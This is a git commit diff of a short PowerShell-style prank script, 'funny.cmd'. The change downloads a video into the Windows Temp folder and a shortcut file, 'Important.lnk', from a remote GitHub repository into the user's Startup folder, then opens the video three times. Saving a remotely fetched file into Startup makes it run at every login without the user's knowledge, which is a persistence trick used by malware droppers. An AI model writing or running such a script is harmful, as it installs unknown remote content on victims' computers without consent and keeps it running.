ccea5485c195621ac4e180127f3364ce9a2dea8f
Almond Breeze <otmc00@gmail.com>
2024-08-29 18:36:04 -0400

    whatever

--- funny.cmd
+++ funny.cmd
@@ -1,4 +1,11 @@
-$source = "https://raw.githubusercontent.com/toomuchspaghetti/Test/master/sigma.mp4"
-$destination = "C:\Windows\Temp\skibidi.mp4"
+$sigma_source = "https://raw.githubusercontent.com/toomuchspaghetti/Test/master/sigma.mp4"
+$important_source = "https://raw.githubusercontent.com/toomuchspaghetti/Test/master/Important.lnk"
+$sigma_file = "C:\Windows\Temp\skibidi.mp4"
+$important_file = -join([Environment]::GetFolderPath('Startup'), "/Important.lnk")
 
-(new-object System.Net.WebClient).DownloadFile($source, $destination)
+(new-object System.Net.WebClient).DownloadFile($sigma_source, $sigma_file)
+(new-object System.Net.WebClient).DownloadFile($important_source, $important_file)
+
+start $sigma_file
+start $sigma_file
+start $sigma_file
